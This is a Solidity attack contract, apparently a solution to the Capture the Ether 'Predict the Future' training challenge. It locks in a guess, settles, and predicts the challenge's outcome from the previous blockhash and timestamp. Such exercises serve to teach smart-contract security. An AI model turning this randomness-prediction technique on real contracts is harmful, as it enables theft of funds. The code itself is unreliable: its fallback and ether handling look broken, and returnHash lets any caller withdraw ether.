pragma solidity ^0.4.21;

interface PredictTheFutureChallenge {

    function isComplete() public view returns (bool);
    function lockInGuess(uint8 n) public payable;
    function settle() public;
}

contract AttackTheFutureChallenge {
    
    address victimAddr = 0;
    
    function AttackTheFutureChallenge(address _addr) public payable {
        victimAddr = _addr;        
    }

    function fallback() payable {}

    function Attack (uint8 n) {
        PredictTheFutureChallenge victimContract = PredictTheFutureChallenge(victimAddr);
        victimContract.lockInGuess(n);
    }

    function Win() public {
        PredictTheFutureChallenge victimContract = PredictTheFutureChallenge(victimAddr);
        victimContract.settle();
    }

    function returnHash(uint sendGwei) public view returns (uint8){
        if (sendGwei > 0){
            msg.sender.transfer(sendGwei);
        }
    return uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
    }

}
